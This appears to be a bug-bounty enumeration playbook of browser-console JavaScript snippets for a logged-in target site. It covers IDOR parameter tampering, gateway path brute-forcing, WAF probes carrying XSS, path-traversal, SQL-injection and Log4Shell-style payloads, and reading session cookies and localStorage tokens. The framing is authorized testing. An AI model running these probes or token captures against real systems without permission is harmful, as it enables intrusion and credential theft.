# Enumeration Recipes (browser_console fetch)

Run these inside the target page context via `browser_console`. They carry
`credentials:'include'` (session cookie) and a mandatory program header if the
engagement requires one. Same-origin fetch from the page is NOT CORS-blocked.

Replace `TARGET` and header values as needed.

## 1. Read the one readable session endpoint + IDOR tamper
```js
(async()=>{
  const H={'X-Inspectiv-Tester':'RESEARCHER'};
  const base='https://TARGET/app/rest/user-context';
  const variants=['?pageType=home','?pageType=home&userId=980935951',
    '?pageType=home&callerId=980935951',
    '?pageType=home&personId=00000000-0000-0000-0000-000000000001'];
  for(const v of variants){
    const r=await fetch(base+v,{credentials:'include',headers:H});
    const j=await r.json(); const u=j.userContextData;
    console.log(v,'=> userId='+u.userId,'logon='+u.callerLogonId,'auth='+u.authenticationState);
  }
})();
```
If userId stays YOUR id across all variants -> session-scoped, IDOR ruled out.

## 2. Gateway path brute (reads 401 JSON `path` to leak internal prefix)
```js
(async()=>{
  const H={'X-Inspectiv-Tester':'RESEARCHER'};
  const base='https://TARGET/gateway/';
  const paths=['account/addresses','account/orders','account/wallet','account/pets',
    'account/prescriptions','account/profile','account/autoship','account/payment-methods'];
  for(const p of paths){
    const r=await fetch(base+p,{credentials:'include',headers:H});
    const ct=r.headers.get('content-type')||'';
    const b=ct.includes('json')?JSON.stringify(await r.json()).slice(0,200):(await r.text()).slice(0,120);
    console.log(r.status,p,'['+ct.split(';')[0]+']',b);
  }
})();
```
A 401 with `{"path":"/eks/app/<svc>/..."}` reveals the internal gateway route.

## 3. WAF/input probe on a free-text param
```js
(async()=>{
  const H={'X-Inspectiv-Tester':'RESEARCHER'};
  const base='https://TARGET/app/rest/user-context';
  const v=['?pageType=<script>alert(1)</script>','?pageType=../../etc/passwd',
    "?pageType=';DROP TABLE x;--",'?pageType=${jndi:ldap://x}','?pageType=','?pageType=home&extra=1','?foobar=test'];
  for(const x of v){
    const r=await fetch(base+x,{credentials:'include',headers:H});
    const t=await r.text();
    console.log(r.status,x.slice(0,40),'len='+t.length,(t.includes('<script>alert')?'[REFLECTED!]':''));
  }
})();
```
Expect 403 on the malicious values (WAF working), 200 on benign. Reflection = bug.

## 4. Capture auth token from page context
```js
(()=>{
  const c=document.cookie.split(';').map(s=>s.trim());
  const jwt=c.find(x=>x.startsWith('ticket='))||c.find(x=>x.includes('eyJ'));
  const ls=Object.keys(localStorage).filter(k=>/token|auth|kc-|jwt|access/i.test(k));
  console.log('jwtCookie='+(jwt?jwt.slice(0,20)+'...':'(none)'),'lsTokens='+JSON.stringify(ls));
})();
```

## 5. SSR route + host mining (from a logged-in page)
```js
(()=>{
  const t=document.documentElement.outerHTML;
  const nd=document.querySelector('#__NEXT_DATA__'); const nt=nd?nd.textContent:'';
  const src=[t,nt].join('\n');
  const hits=[...new Set([...src.matchAll(/(?:["'`])([^"'`]*\/(?:api|graphql|gql|rest|gateway|v1|v2|account|order|pet|address|payment)\/[^"'`]*?)(?:["'`])/gi)].map(x=>x[1]))]
    .filter(x=>!/image\.chewy|api\/event|googletagmanager|facebook|tiktok|bing|doubleclick|segment|dynatrace|onetrust|cookielaw|taboola|reddit/.test(x) && x.length<160);
  console.log(hits.slice(0,80).join('\n'));
})();
```

## Tips
- Batch everything into ONE console call per page load; re-navigate between
  batches (Kasada/Keycloak sessions drop fast).
- If the page resets to `about:blank`, re-navigate to the live URL, then re-run.
- Redact any token/cookie value to last 6 chars before pasting into chat.
